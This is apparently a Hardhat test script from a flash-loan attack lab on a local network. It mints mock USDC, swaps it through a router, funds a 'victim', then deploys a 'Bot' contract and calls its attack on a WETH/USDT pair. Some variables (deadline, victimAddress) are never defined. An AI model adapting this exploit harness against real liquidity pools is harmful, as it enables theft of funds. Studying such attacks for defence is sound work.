const { ethers, hre } = require("hardhat");

const {
  uniswapAddress,
  usdc,
  usdt,
  weth,
  usdcAddress,
  usdtAddress,
  wethAddress,
  router,
  routerAddress,
  wethUsdtPair,
} = require("../../../scripts/flashLoan/fl_deploy_yes.js");
async function main() {
  const [deployer, account01, account02, account03] = await ethers.getSigners();
  const account1 = account01.address;
  const account2 = account02.address;
  console.log(`deployer Address: ${deployer.address}`);

  console.log("\n---------usdc swap usdt--------------------------");

  //给 router 铸造900000的usdc币
  await usdc.mint(routerAddress, 900000);

  //用900000 usdc 换 usdt
  const path = [usdcAddress, usdtAddress]; //前者是input地址，后者地址是output地址
  console.log("swap ing......");
  let amounts = await router
    .connect(deployer)
    .swapExactTokensForTokens(900000, 10000, path, deployer, deadline);

  await usdc.mint(victimAddress, 900000);
  console.log(`victim fin `);

  console.log("-------------攻击--------------------------");

  await usdt.approve(router, 99999999999999);
  await weth.transfer(wethUsdtPair, 100);
  const Bot = await ethers.getContractFactory("Bot");
  const bot = await Bot.deploy(
    usdcAddress,
    usdtAddress,
    wethAddress,
    routerAddress
  );
  const botAddress = await bot.getAddress();
  console.log(`bot : ${botAddress} `);

  await bot.attack(wethUsdtPair);

  const balance = await weth.callStatic.balanceOf(botAddress);
  console.log(`bot balance: ${balance} `);
}

// 执行主函数并处理可能的结果。
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
